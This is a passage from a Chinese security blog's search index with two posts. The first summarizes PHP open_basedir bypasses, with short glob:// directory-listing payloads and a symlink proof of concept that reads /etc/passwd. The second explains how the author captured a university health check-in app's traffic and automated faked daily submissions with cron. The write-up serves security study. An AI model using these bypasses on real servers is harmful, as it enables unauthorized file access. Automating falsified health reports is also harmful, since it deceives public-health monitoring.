+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 循环 ext/spl/examples/ 目录里所有 *.php 文件</span></span><br><span class="line"><span class="comment">// 并打印文件名和文件尺寸</span></span><br><span class="line">$it = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob://ext/spl/examples/*.php&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>($it <span class="keyword">as</span> $f) &#123;</span><br><span class="line">    printf(<span class="string">&quot;%s: %.1FK\n&quot;</span>, $f-&gt;getFilename(), $f-&gt;getSize()/<span class="number">1024</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<p>  单纯使用此协议并不能列目录。不过使用此协议只能列目录(且只能列举根目录下的文件和限制目录下的文件)，并不能读写文件≧ ﹏ ≦</p>
+<h2 id="DirectoryIterator-glob"><a href="#DirectoryIterator-glob" class="headerlink" title="DirectoryIterator+glob://"></a>DirectoryIterator+glob://</h2><p>这个是老朋友了，php5的新增类，<a href="https://www.php.net/manual/zh/class.directoryiterator.php">DirectoryIterator</a>类提供了一个查看文件系统目录内容的简单接口  </p>
+<p>pl：<code>$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#39;  &#39;);&#125;</code></p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/%E6%80%BB%E7%BB%93/20210324171439.png" alt="image-20210324171439341"></p>
+<h2 id="scandir-glob"><a href="#scandir-glob" class="headerlink" title="scandir()+glob://"></a>scandir()+glob://</h2><p>pl: <code>var_dump(scandir(&#39;glob:///*&#39;));</code>  函数如果没有ban掉这个方法简单易用</p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/%E6%80%BB%E7%BB%93/20210324171936.png" alt="image-20210324171936725"></p>
+<h2 id="opendir-readdir-glob"><a href="#opendir-readdir-glob" class="headerlink" title="opendir()+readdir()+glob://"></a>opendir()+readdir()+glob://</h2><p>pl: <code>if($b=opendir(&#39;glob:///*&#39;))&#123;while (($file = readdir($b)) !== false)&#123;echo $file.&quot;  &quot;;&#125;closedir($b);&#125;</code></p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/%E6%80%BB%E7%BB%93/20210324172345.png" alt="image-20210324172344946"></p>
+<h1 id="symlink-函数"><a href="#symlink-函数" class="headerlink" title="symlink()函数"></a>symlink()函数</h1><h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a><a href="https://www.php.net/manual/zh/function.symlink.php">简介</a></h2><ul>
+<li><p>symlink — 建立符号连接（php4开始启用）  </p>
+</li>
+<li><p>symlink ( string <code>$target</code> , string <code>$link</code> ) : bool  </p>
+</li>
+<li><p>一般受限于open_basedir</p>
+</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/%E6%80%BB%E7%BB%93/20210324174151.png" alt="image-20210324174151803"></p>
+<h2 id="简单poc"><a href="#简单poc" class="headerlink" title="简单poc"></a>简单poc</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    mkdir(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">    chdir(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">    mkdir(<span class="string">&quot;b&quot;</span>);</span><br><span class="line">    chdir(<span class="string">&quot;b&quot;</span>);</span><br><span class="line">    mkdir(<span class="string">&quot;c&quot;</span>);</span><br><span class="line">    chdir(<span class="string">&quot;c&quot;</span>);</span><br><span class="line">    mkdir(<span class="string">&quot;d&quot;</span>);</span><br><span class="line">    chdir(<span class="string">&quot;d&quot;</span>);<span class="comment">//创建并进入到/var/www/html/a/b/c/d目录下</span></span><br><span class="line">    chdir(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">    chdir(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">    chdir(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">    chdir(<span class="string">&quot;..&quot;</span>);<span class="comment">//返回/var/www/html</span></span><br><span class="line">    symlink(<span class="string">&quot;a/b/c/d&quot;</span>,<span class="string">&quot;yq1ng&quot;</span>);<span class="comment">//创建连接符 yq1ng -&gt; a/b/c/d</span></span><br><span class="line">    symlink(<span class="string">&quot;yq1ng/../../../../etc/passwd&quot;</span>,<span class="string">&quot;exp&quot;</span>);<span class="comment">// exp -&gt; a/b/c/d/../../../../etc/passwd (a/b/c/d/../../../../ -&gt; /var/www/html/在限制内，所以成功创建)</span></span><br><span class="line">    unlink(<span class="string">&quot;yq1ng&quot;</span>);<span class="comment">// 删除连接</span></span><br><span class="line">    mkdir(<span class="string">&quot;yq1ng&quot;</span>);<span class="comment">// 创建文件夹</span></span><br><span class="line">    system(<span class="string">&#x27;cat exp&#x27;</span>);<span class="comment">//此时 exp -&gt; yq1ng/../../../../etc/passwd</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/%E6%80%BB%E7%BB%93/20210324174903.png" alt="image-20210324174903206"></p>
+<p>参考<a href="https://www.leavesongs.com/bypass-open-basedir-readfile.html">p神文章</a></p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.php.net/manual/en/ini.core.php">PHP手册：php.ini核心配置</a></p>
+<p><a href="https://blog.csdn.net/fdipzone/article/details/54562656">php文件包含目录配置open_basedir的使用与性能分析</a></p>
+<p><a href="https://www.v0n.top/2020/07/10/open_basedir%E7%BB%95%E8%BF%87/">open_basedir绕过</a></p>
+]]></content>
+      <categories>
+        <category>总结</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>自动化健康打卡</title>
+    <url>/z_post/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%81%A5%E5%BA%B7%E6%89%93%E5%8D%A1/</url>
+    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>记一次无聊下午写的自动化健康打卡，本脚本适用于黄淮学院，开箱即用，略改配置即可。  </p>
+<p>因为前几天忘打卡了，趁着今天下午没事就来试试写个脚本一劳永逸</p>
+<a id="more"></a>
+
+<h1 id="0x01-所需工具"><a href="#0x01-所需工具" class="headerlink" title="0x01 所需工具"></a>0x01 所需工具</h1><ul>
+<li>fiddler</li>
+<li>夜神模拟器</li>
+<li>云上黄淮app</li>
+</ul>
+<h1 id="0x02-抓包-amp-分析"><a href="#0x02-抓包-amp-分析" class="headerlink" title="0x02 抓包&amp;分析"></a>0x02 抓包&amp;分析</h1><p>从登陆界面开始抓包，一直抓到打卡结束，定位用虚拟定位随意找个地方，我用的北区一号楼   </p>
+<p>登陆包是明文传输账户密码，彳亍！响应包是json，其中idToken是jwt，加密方式是RS512也就是sha521，破解几乎不可能啦，我没试，无聊的话可以试试爆破。jwt有到期的时间戳，看了一下有效期为一个月，可以的，拉到bp里面测试看看，成了，还给了设备id和操作系统，无关紧要啦  </p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/%E6%80%BB%E7%BB%93/20210327195931.png" alt="image-20210327195929523"></p>
+<p>跟着往下走是拉取了上一次的打卡记录，里面存放着打卡的各种信息，没啥用。   </p>
+<p>再往下就是提交打卡数据了（获取定位略过就行），提交方式是POST，写脚本的时候发现一个headers参数x-auth-token不知从何而来，顺着往上一个数据包一个数据包找发现有个包带着idToken访问了一个api，这个api负责分发session也就是我们要的x-auth-token，这就简单了，写脚本吧  。    </p>
+<p>带着自己的idToken取分发session的页面，返回一个唯一id，直接访问可以看到已经是打卡页面  </p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/%E6%80%BB%E7%BB%93/20210327200157.png" alt="image-20210327200157533"></p>
+<p>最后带着cookies和post的数据去了<code>https://yq.huanghuai.edu.cn:7992/questionAndAnser/wenjuanSubmit</code>，打卡结束</p>
+<p>脚本已上传至gayhub，<a href="">传送门</a>，代码能力较差，懒得优化了，能用就行。</p>
+<h1 id="0x03-使用"><a href="#0x03-使用" class="headerlink" title="0x03 使用"></a>0x03 使用</h1><p>需要一个vps，安装python3.x，如果是centos则自带了py2，按照下面教程  </p>
+<p>先安装epel扩展源：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum -y install epel-release</span><br></pre></td></tr></table></figure>
+
+<p>然后安装python-pip</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum -y install python-pip</span><br></pre></td></tr></table></figure>
+
+<p>在安装python3</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;www.python.org&#x2F;ftp&#x2F;python&#x2F;3.6.2&#x2F;Python-3.6.2.tgz</span><br><span class="line">tar -zxvf Python-3.6.2.tgz</span><br><span class="line">cd Python-3.6.2&#x2F;</span><br><span class="line">.&#x2F;configure --prefix&#x3D;&#x2F;usr&#x2F;local</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
+
+<p>验证</p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/%E6%80%BB%E7%BB%93/20210327200817.png" alt="image-20210327200817479"></p>
+<p>安装脚本运行环境<code>pip3 install requests</code></p>
+<p>如果想在加个邮件发送服务就看下面的，不想加的话把<code>healthCheck-in.py</code>里面的<code>import os</code>和下图两行删除  <img src="https://raw.githubusercontent.com/yq1ng/blog/master/%E6%80%BB%E7%BB%93/20210327201117.png" alt="image-20210327201117346"></p>
+<p>下载的脚本随便放个目录（强烈建议和我放的一样，不然你还要改东西，我的是<code>/opt/healthCheck-in/</code>），如果不一样请自行修改三个文件里面打开文件与关闭文件的路径（使用绝对路径！），再写个定时任务，本人定时任务如下</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">30 7 1,20 * *  /usr/local/bin/python3 /opt/healthCheck-in/getToken.py</span><br><span class="line">50 7 * * *  /usr/local/bin/python3 /opt/healthCheck-in/getSession.py</span><br><span class="line">00 8 * * *  /usr/local/bin/python3 /opt/healthCheck-in/healthCheck-in.py&gt;/tmp/healthCheck-in.log 2&gt;&amp;1&amp;</span><br></pre></td></tr></table></figure>
+
+<p><code>crontab -u root -e</code>进入编辑页面，直接把我的配置粘进去就行  </p>
+<p>按照<code>getToken.py</code>和<code>healthCheck-in.py</code>注释修改配置，另外设备id和客户端id去这个网站生成：<a href="https://www.345tool.com/zh-hans/generator/random-id-generator">https://www.345tool.com/zh-hans/generator/random-id-generator</a></p>
+<p><code>deviceId</code>是24位，这样生成（0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ）  </p>
+<p>  <img src="https://raw.githubusercontent.com/yq1ng/blog/master/%E6%80%BB%E7%BB%93/20210327205046.png" alt="image-20210327205042217"></p>
+<p><code>clientId</code>是32位，这样</p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/%E6%80%BB%E7%BB%93/20210327205119.png" alt="image-20210327205119590"></p>
+<p>再运行一遍前两个文件，确保生成<code>cookies.txt</code>和<code>Location.txt</code>两个文件，然后就不用管了，芜湖~</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;usr&#x2F;local&#x2F;bin&#x2F;python3 &#x2F;opt&#x2F;healthCheck-in&#x2F;getToken.py</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;bin&#x2F;python3 &#x2F;opt&#x2F;healthCheck-in&#x2F;getSession.py</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="邮件发送"><a href="#邮件发送" class="headerlink" title="邮件发送"></a>邮件发送</h1><p>每次打卡完成向自己qq发送邮件提醒</p>
+<p><code>yum -y install sendmail* mailx</code>  </p>
+<p><code>vim /etc/mail.rc</code>  </p>
+<p>在末尾添加</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set from&#x3D;xxx@mimvp.com</span><br><span class="line">set smtp&#x3D;smtp.exmail.qq.com</span><br><span class="line">set smtp-auth-user&#x3D;xxx@mimvp.com</span><br><span class="line">set smtp-auth-password&#x3D;mimvp-password    &#x2F;&#x2F;qq邮箱授权码</span><br><span class="line">set smtp-auth&#x3D;login</span><br></pre></td></tr></table></figure>
+
+<p>更详细的看下面的连接，祝好运~</p>
+<h3 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h3><p><a href="https://blog.mimvp.com/article/26872.html">https://blog.mimvp.com/article/26872.html</a>  </p>
+<p><a href="https://blog.csdn.net/SUDDEV/article/details/100056083">https://blog.csdn.net/SUDDEV/article/details/100056083</a>  </p>
+<p><a href="http://www.hellokvm.com/?p=426">http://www.hellokvm.com/?p=426</a>  </p>
+<p><a href="https://my.oschina.net/leeyisoft/blog/1510870">https://my.oschina.net/leeyisoft/blog/1510870</a>  </p>
+<p><a href="https://blog.csdn.net/SHENLINGSUIFENG/article/details/50888061?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.baidujs&amp;dist_request_id=1328740.14468.16168436693395835&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.baidujs">https://blog.csdn.net/SHENLINGSUIFENG/article/details/50888061?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.baidujs&amp;dist_request_id=1328740.14468.16168436693395835&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.baidujs</a>  </p>
+]]></content>
+  </entry>
 </search>
